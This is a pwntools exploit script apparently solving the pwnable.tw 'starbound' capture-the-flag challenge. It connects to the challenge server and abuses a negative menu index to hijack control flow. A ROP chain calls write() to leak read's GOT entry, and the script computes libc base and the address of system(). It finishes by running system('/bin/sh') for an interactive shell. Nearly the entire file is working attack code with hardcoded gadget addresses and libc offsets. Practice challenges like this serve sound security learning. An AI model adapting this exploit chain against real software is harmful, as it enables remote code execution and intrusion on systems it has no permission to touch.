from pwn import *

#s = process("/root/starbound")
s = remote("chall.pwnable.tw",10202)

addesp_1c = 0x0804926D
puts_plt = 0x08048B90
read_got = 0x08055054
pppr = 0x080491ba
ppret  = 0x080499EE
pret = 0x080499ef
main = 0x0804A605
write = 0x08048A30
ret = 0x0804A6E0
random_name = 0x080580D0

def leak(address):
	s.recvuntil("> ")
	payload = "-33 "+"aaaa"+p32(write) + p32(pppr) + p32(1) + p32(address) +p32(4)+p32(0x0804A617)
	s.sendline(payload)
	return s.recvn(4)

s.recvuntil("> ")
s.sendline("6")
s.recvuntil("> ")
s.sendline("2")
s.recv(1024)
payload = p32(addesp_1c) + "/bin/sh;"              # eip_control
s.sendline(payload)
s.recvuntil("> ")
s.sendline("1")


libc_base = u32(leak(read_got)) - 0xd5980
libc_system = libc_base + 0x3ada0
"""
libc_system = d.lookup('system','libc')
libc_base = d.lookup(None,'libc')
off_read = u32(leak(read_got)) - libc_base
print hex(libc_system-libc_base)                   # offset of system
print hex(off_read)								   # offset of read
"""

s.recvuntil("> ")
payload = "-33 "+"aaaa"+p32(libc_system) + p32(libc_system) + p32(random_name+4) +p32(random_name+4)
s.sendline(payload)
s.interactive()